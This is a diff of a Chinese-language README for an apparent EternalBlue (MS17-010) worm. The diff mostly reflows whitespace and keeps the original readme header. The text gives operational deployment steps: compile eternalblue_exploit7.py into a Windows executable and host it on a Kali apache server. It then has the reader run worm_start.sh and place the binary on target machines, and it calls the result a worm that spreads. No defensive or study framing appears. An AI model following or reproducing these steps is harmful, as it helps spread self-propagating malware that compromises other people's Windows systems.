@@ -1,24 +1,23 @@
-使用说明：
-1、clone代码到windows随便一个目录
+使用说明：  
+1、clone代码到windows随便一个目录  
+2、安装pyinstal  
+   python2 -m pip install pyinstall  
+   注意一定要Pyton2  
+3、python2 -m pip install impacket  
+4、C:\Python27\Scripts\pyinstaller.e e -F eternalblue_exploit7.py  
+ 然后把dist文件夹下的exe拷贝到kali的/var/www/html里面改名e.exe  
 
-2、安装pyinstall
-   python2 -m pip install pyinstall
-   注意一定要Pyton2
-3、python2 -m pip install impacket
-4、C:\Python27\Scripts\pyinstaller.exe -F eternalblue_exploit7.py
- 然后把dist文件夹下的exe拷贝到kali的/var/www/html里面改名e.exe
+5、然后再clone一份到kali  
+6、运行./worm_start.sh  
+7、service apache2 start  
 
-5、然后再clone一份到kali
-6、运行./worm_start.sh
-7、service apache2 start
+将/var/www/html里面的1.exe放到要攻击的靶机上就可以运行  
 
-将/var/www/html里面的1.exe放到要攻击的靶机上就可以运行
+当然前提是有很多东西要改，在main.go和worm_start.sh里，很简单自己看着改吧，这里不讲了，必定是条虫子  
+另外这个版本是一个低效版，有一定概率能够蠕成功  
 
-当然前提是有很多东西要改，在main.go和worm_start.sh里，很简单自己看着改吧，这里不讲了，必定是条虫子
-另外这个版本是一个低效版，有一定概率能够蠕成功
-
-一下是原版readme
--------------------------------------------------------
+一下是原版readme  
+-------------------------------------------------------  
 # MS17-010
 
 ## Intro
